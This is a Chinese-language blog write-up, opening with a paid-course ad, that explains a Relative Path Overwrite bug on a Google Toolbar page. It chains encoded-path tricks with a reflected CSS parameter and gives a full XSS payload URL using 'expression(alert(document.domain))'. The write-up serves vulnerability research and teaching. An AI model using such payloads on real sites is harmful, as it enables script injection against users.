#原文链接
`https://blog.innerht.ml/rpo-gadgets/`

#前言
最近，我做了一个培训，主要是关于漏洞挖掘的进阶经验谈，会有大量的国外文章的分析和骚姿势，收费是2000元，50课时，面向有基础的学员，毕业包回本。我的QQ `1119544572` WeChat `baiheming123456` contact me～

#正文
首先先说什么是RPO(Relative Path Overwrite)相对路径覆盖，在Google的工具栏中找到了一个页面`http://www.google.com/tools/toolbar/buttons/apis/howto_guide.html`
其中存在RPO的漏洞代码是
```html
<html>
<head>
<title>Google Toolbar API - Guide to Making Custom Buttons</title>
<link href="../../styles.css" rel="stylesheet" type="text/css" />
[..]
```
存在问题的是link标签中的**../../styles.css**这是通过相对路径进行加载，当这样的时候我们吧目光转移到服务器的解析上，不同的服务器都有不同的解析特点，比如JSP的`;`当JSP解析遇到了分号之后后面的都是作为参数，而浏览器会当作路径
`https://test.com/Jsptest/aaa;/test`此时浏览器会认为还有一个test在aaa目录下。这里还要说一下浏览器的处理对于目录浏览器用`/`分隔，下面吧上面的内容带到实力中

在google的工具栏中也有解析的特点
`http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html`服务器处理的时候会对请求路径的内容进行解码，也就是说`2f`会被当作`/`解析然而浏览器不这么想，它认为`apis%2fhowto_guide.html`是一个文件，而这个时候再去执行
```html
<link href="../../styles.css" rel="stylesheet" type="text/css" />
```
他就会去`http://www.google.com/tools/`下寻找`styles.css`这样还是没啥意义的
##峰回路转
`http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html`我们可以发现有一个/fake/..%2f这样的话还是会访问到`howto_guide.html`而且还可以让浏览器认为自己在`/tools/fake/`浏览器就会加载`http://www.google.com/tools/fake/styles.css`也就是说我们可以加载`http://www.google.com/tools/*/styles.css`

#组合
在寻找敏感Endpoint的时候发现了这个`http://www.google.com/tools/toolbar/buttons/gallery`当你访问的时候会跳转到`http://www.google.com/gadgets/directory?synd=toolbar&frontpage=1`这里刚刚好符合我们的利用条件即在tools目录下面。
然而这个Endpoint还有一个有趣的点就是`q`参数，当我们访问`http://www.google.com/gadgets/directory?synd=toolbar&frontpage=1&q={}*{backgound:red}`
![PIC](https://c1h2e1.oss-cn-qingdao.aliyuncs.com/image/RPO/css-red.png)
这里就是一个可以反射的点了，那么我们怎么才能让这两个点相结合呢
当我们访问`http://www.google.com/tools/toolbar/buttons/gallery?q={}*{backgound:red}`有参数的时候就会跳转到`http://www.google.com/gadgets/directory?synd=toolbar&frontpage=1&q={}*{backgound:red}`
那么万事俱备了，我们需要的就是从刚刚的地方去利用RPO漏洞与这个端点结合

#利用
`http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html`

```
/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/../../style.css
浏览器会认为目前在的目录是apis向上之后就到了 下面的
--->

/tools/toolbar/buttons/gallery?q=%0a{}*{background:red}/style.css
访问之后会跳转到

-->

/gadgets/directory?synd=toolbar&frontpage=1&q=%0a{}*{background:red}/style.css

```
这是我们的
```html
<link href="../../styles.css" rel="stylesheet" type="text/css" />就变成了
<link href="/gadgets/directory?synd=toolbar&frontpage=1&q=%0a{}*{background:red}/style.css" rel="stylesheet" type="text/css" />
就把{}*{background:red}包含了
```
将 payload修改为XSS的payload`expression(alert(document.domain))`就可以完成一次XSS攻击了
#最终payload
`
http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bx%253Aexpression(alert(document.domain))%257D/..%2f/apis/
`
![PIC](https://c1h2e1.oss-cn-qingdao.aliyuncs.com/image/RPO/alert.png)

#总结
看都会一脸蒙蔽可见挖掘的过程有多复杂，我一直在路上！
